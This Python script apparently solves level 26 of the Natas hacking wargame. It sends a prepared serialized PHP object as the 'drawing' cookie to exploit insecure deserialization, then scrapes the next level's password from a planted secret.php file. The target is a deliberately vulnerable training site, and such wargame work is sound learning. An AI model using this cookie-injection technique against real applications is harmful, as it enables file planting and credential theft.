from urllib import parse

from config import password_length, assets_folder
from utils import get_level_url, get_request_object, store_secret_and_print_message

level_number = 26


def get_secret():
    with open(f"{assets_folder}/natas26_serialized.txt", "rb") as file:
        req = get_request_object(level_number)
        drawing = parse.quote(str(file.read(), "utf-8"))
        req.get(get_level_url(level_number), cookies={"drawing": drawing})
        result = req.get(get_level_url(level_number) + "/img/secret.php")
        text = result.text
        search = "natas27 Password:"

        if search in text:
            start_index = text.find(search) + len(search) + 1
            return text[start_index: start_index + password_length]

    return ""


secret = get_secret()
store_secret_and_print_message(level_number, secret)
